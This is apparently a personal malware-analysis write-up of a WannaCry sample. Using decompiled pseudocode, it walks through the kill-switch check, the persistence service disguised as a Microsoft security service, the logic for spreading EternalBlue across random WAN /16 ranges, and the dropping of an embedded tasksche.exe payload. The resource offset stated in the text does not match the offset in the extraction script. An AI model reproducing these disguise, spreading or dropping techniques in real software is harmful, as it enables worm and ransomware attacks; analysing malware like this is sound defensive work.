## Analysis

### Section one, the loader and the spreader
The sample I worked on was one PE file with a placeholder name, as this was a second hand executable, the original filename is lost. I aptly named this `wannacry.bin`.

The first thing I noticed about the exe was its size, it was 3.55mb. This is abnormally big for most executables.

sha256: `24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c`. 


### "Main"
Opening this binary in a reversing tool and navigating to the the WinMain function, the first thing that I noticed was the following `strcpy` function:
```c
strcpy(death_url, "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com");
```

I looked at the xrefs for the string's location but found no other mentions. This gives me a hunch that this is the function where the check for the kill switch domain is done. 

Reading on, this does seem to be the case. A few difference `wininet.h` functions are called in order to test whether the aforementioned kill switch url is replying to queries:
```c
internet_handle = InternetOpenA(0, 1, 0, 0, 0);
url_handle = InternetOpenUrlA(internet_handle, death_url, 0, 0, 0x84000000,0);
InternetCloseHandle(internet_handle);
if ( url_handle )
{
  InternetCloseHandle(url_handle);
}
else
{
  InternetCloseHandle(0);
  WannaCryMain();
}
return 0;
```
The process attempts to open a connection to the passed URL. If it receives a reply, it will close the internet handle and exit the process (As the `return` is in the main function, the process exits.). If however the process does not receive any reply however, it will call the `WannaCryMain` function. We can assume that this is where the real execution of the malware, or at least some part of it begins.

### WannaCryMain
Moving on to the `WannaCryMain`, we can see that the process will save its own executable path to the `FileNameSelf` variable. Keep this in mind, as it will become important later on. After this, the process will check the arguments it was run with:
```c
GetModuleFileNameA(0, FileNameSelf, 260u);
if ( *_p___argc() < 2 )
  return ArgumentsParser();
```
If the it was run with less than two arguments, which translates to no arguments as the first argument is the executable path, we will jump to the `ArgumentParser` function.

### ArgumentParser
This function in will run two different functions. The name is kind of misleading, as no operations are done on the passed arguments.
```c
int ArgumentsParser()
{
  CreateService();
  UnpackBinary();
  return 0;
}
```
Let's take a closer look at both of these functions.
### CreateService
The `CreateService` function is as follows:
```c
sprintf(security_filename, "%s -m security", FileNameSelf);
scm_handle = OpenSCManagerA(0, 0, 0xF003Fu);  
if ( !scm_handle )
  return 0;
service_handle = CreateServiceA(
                   scm_handle,
                   ServiceName,               // mssecsvc2.0
                   DisplayName,               // Microsoft Security Center (2.0) Service
                   0xF01FFu,                  // SERVICE_ALL_ACCESS
                   0x10u,                     // SERVICE_WIN32_OWN_PROCESS
                   2u,                        // SERVICE_AUTO_START
                   1u,                        // SERVICE_ERROR_NORMAL
                   security_filename,
                   0,
                   0,
                   0,
                   0,                         // Uses LocalSystem Account.
                   0);
if ( service_handle )
{
  StartServiceA(service_handle, 0, 0);
  CloseServiceHandle(service_handle);
}
CloseServiceHandle(scm_handle);
return 0;
```
Now, taking a closer look at this, we can determine a few interesting things.
First, the process will use the executable name it retrieved in the `WannaCryMain` function to create a string with the executable path and two additional but unused arguments. 
Using this new string, the process will generate a service with the deceivingly Microsofty name of `mssecsvc2.0` and the display name of `Microsoft Security Center (2.0) Service`. 

After creating the service, the process will start the service with the `StartServiceA` call. The service launches the same executable again with the addition of the two parameters, `-m security`. The actual arguments are unimportant, I assume these were decided on to give this the illusion of being authentic. Flags which conform to the norms are less suspicious than random strings, after all. We know that the entire `ArgumentsParser` function will be skipped in new newly created process, due to the argument length check.

Before we look at the `UnpackBinary` function, let's look at what the created service does. After returning from the `ArgumentsParser` function, the following code will be ran:
### Exploring WannaCryMain further
```c
scm_handle = OpenSCManagerA(0, 0, 0xF003Fu);
if ( scm_handle )
{
  service_handle = OpenServiceA(scm_handle, ServiceName, 0xF01FFu);
  service_handle_cp = service_handle;
  if ( service_handle )
  {
    ModifyService(service_handle, 60);
    CloseServiceHandle(scm_handle);
  }
  CloseServiceHandle(scm_handle);
}
ServiceStartTable.lpServiceName = ServiceName;
ServiceStartTable.lpServiceProc = ServiceEntryPoint;
```
As you might guess, the `ServiceName` variable refers to the previously created `mssecsvc2.0` service. My understanding of this is, that the code will modify service's entrypoint to be the `ServiceEntryPoint` function pointer. 
### ServiceEntryPoint function
Opening `ServiceEntryPoint`, we see the following:
```c
SERVICE_STATUS_HANDLE handle_service_status;
handle_service_status = RegisterServiceCtrlHandlerA(ServiceName, HandlerProc);
hServiceStatus = handle_service_status;
if ( handle_service_status )
{
  ServiceStatus.dwCurrentState = 4;
  ServiceStatus.dwCheckPoint = 0;
  ServiceStatus.dwWaitHint = 0;
  SetServiceStatus(handle_service_status, &ServiceStatus);
  EternalBlueService();
  Sleep(86400000u);                           // 24 hours
  ExitProcess(1u);
}
return handle_service_status;
```
In short, the service will run the `EternalBlueService` function, sleep for 24 hours and exit. As is obvious, the most interesting thing to us in this section, is the `EternalBlueService` function. 
### EternalBlue function(s)
The EternalBlueService function holds a few interesting parts:
```c
result = InitCrypto_ReadSelf();
if ( result )
{
  thread_handle = beginthreadex(0, 0, EternalBlueLocalRange, 0, 0, 0);
  if ( thread_handle )
    CloseHandle(thread_handle);
  for ( i = 0; i < 128; ++i )
  {
    package_async = beginthreadex(0, 0, EternalBlueRandomWanRange, i, 0, 0);
    if ( package_async )
      CloseHandle(package_async);
    Sleep(2000u);
  }
  return 0;
}
return result;
```
The function will create a single thread which has the entrypoint of the `EternalBlueLocalRange` function. After generating this thread, the function creates 128 threads which each will run the `EternalBlueRandomWanRange` function. 

The `EternalBlueLocalRange` function is not that interesting for this write up. As the name suggests, it will find the local network, iterate through it and attempt to spread to other machines with the EternalBlue SMBv1 exploit.

I found the `EternalBlueRandomWanRange` function however, to be rather interesting. The code itself is too verbose and complex to be in the scope of this write up, especially as an inline function. In short, my understanding of the function is the following:
- It will generate at a random WAN IP address. 
- If it is valid, it will iterate the /16 range of the address for 40 minutes.
- It will attempt to infect every host in the range with EternalBlue

My immediate reaction to this was confusion, why not just directly iterate through the WAN IP range one by one? This seems less robust. Thinking about it more, I realised. If every host you infect would do the same, every host after the first one will spend the majority if not all of its lifecycle iterating already infected machines. The outcome of this will be a denial of service and the further hosts will not be able to speed up the world wide infection.

I feel like the way the process solves this issue is smart. By iterating through random addresses, the likelihood of two infected machines hitting colliding random IP addresses is somewhat unlikely, making the spreading optimal if you are unable to communicate with other hosts.

Similarly to the `EternalBlueLocalRange`, after this function finds a host that's alive and listening in on port `445`, the process will attempt to abuse the EternalBlue exploit.

Recapping the service portion, the service acts as the main infector/spreader in this process. It will attempt to infect every machine on the local network, after which it will attempt to infect WAN machines.

### UnpackBinary function
Now that we are done with the service portion, lets get back to the `ArgumentsParser` function. If you remember, after creating and launching the service, the initial process will jump to the `UnpackBinary` function. 

This pseudocode of function is very verbose, so I will omit parts that are not crucial for this write up:
```c
ModuleHandleW = GetModuleHandleW(&ModuleName);
...
CreateProcessADynamic = GetProcAddress(ModuleHandleW, ProcName);
CreateFileADynamic = GetProcAddress(ModuleHandleW_cp, aCreatefilea);
WriteFileDynamic = GetProcAddress(ModuleHandleW_cp, aWritefile);
CloseHandleDynamic = GetProcAddress(ModuleHandleW_cp, aClosehandle);
...
pe_file_info = FindResourceA(0, 0x727, Type);
pe_file_info_cp = pe_file_info;
pe_file_handle = LoadResource(0, pe_file_info);
pe_file_content = LockResource(pe_file_handle);
bytes_written = SizeofResource(0, pe_file_info_cp);
...
sprintf(tasksche_path, "C:\\%s\\%s", aWindows, aTaskscheExe);
sprintf(NewFileName, "C:\\%s\\qeriuwjhrf", aWindows);
MoveFileExA(tasksche_path, NewFileName, 1u);
new_tasksche_handle = CreateFileADynamic(tasksche_path, 0x40000000u, 0, 0, 2u, 4u, 0);
if ( new_tasksche_handle != -1 )
{
  WriteFileDynamic(new_tasksche_handle, pe_file_content, bytes_written, &pe_file_content, 0);
  CloseHandleDynamic(new_tasksche_handle);
  strcat(tasksche_path, &new_executable_name);
  StartupInfo.cb = 68;
  StartupInfo.wShowWindow = 0;
  StartupInfo.dwFlags = 0x81; 
  if ( CreateProcessADynamic(
         0,
         tasksche_path,
         0,
         0,
         0,
         0x8000000u,
         0,
         0,
         &StartupInfo,
         &ProcessInformation) )
  {
    CloseHandleDynamic(ProcessInformation.hThread);
    CloseHandleDynamic(ProcessInformation.hProcess);
  }
}
```
Looking at this function, the process first dynamically fetches the `kernel32.dll` functions `CreateProcessA`, `CreateFileA`, `WriteFile` and `CloseHandle`.
This part originally slightly confused me, as looking at the imports of the process, we can see that the direct functions are used later on. I assume that parts of this code are pasted from other sources. 
It is also possible that the purpose behind using `GetProcAddress` to fetch these functions is to avoid possible references, making analysis more difficult. I find this unlikely, as none of the code seems to be entirely obfuscated.

After acquiring the functions, the process will fetch a resource from inside the binary itself: 
```c
FindResourceA(0, 0x727, Type);
```
This will locate a resource, with the type `R`. 

Next, the process will attempt to move the file `C:\WINDOWS\tasksche.exe` to `C:\WINDOWS\qeriuwjhrf`.
Looking at the `C:\WINDOWS\` directory, this executable does not exist on a clean machine. It is likely, that this is some sort of updating mechanism where the process could potentially keep an older version of itself in case it got ran again. I am however, unsure.

After attempting to move the file, the process will write the resource it located inside of itself to the `C:\WINDOWS\tasksche.exe` binary and attempt to launch it.

This piqued my interest, there is another executable file inside of this executable. Looking at the original executable in PE-bear, I looked at the Resources section and located the resource it was loading. The resource was `0x35a000` bytes long and began at offset `0x3100a4`. With this information, I wrote this dirty python extractor:
```python
offset="0x320a4"
address = int(offset, 16)
bytes_to_read = int("0x35a000", 16)

with open("wannacry.bin", "rb") as f:
    f.seek(address)
    data = f.read(bytes_to_read)
    with open("wannacry_part_2.bin", "wb") as output:
        output.write(data)
```
While not very well written and being very stuffy, for a 10 second job, it got the job well done. I successfully extracted another executable and got to work.

## Afterthoughts
After I saw the domain part, I was unsure as to why the person who originally registered it was confused about what would happen. Even just looking at the assembly side, it feels very obvious as to what is going on. It is possible they just fetched the strings and tried it?

I wasted quite a bit of time reversing the EternalBlue functions trying to understand the logic behind choosing the WAN IPs. This stumped me for a while, as it seemed so unoptimal. I think I could have breezed past it, had I just thought about the bigger picture for a moment. 

I found the `GetProcAddress` parts to be strange. I get the feeling that this executable was written as just a quick wrapper, copying functions from the upcoming executable just to speed up development time.

In terms of meta thoughts regarding this write up, I cut down the code in these examples quite a bit, as there was a lot of fluff in the pseudocode that would have made understanding the code more difficult for little to no benefit to the reader.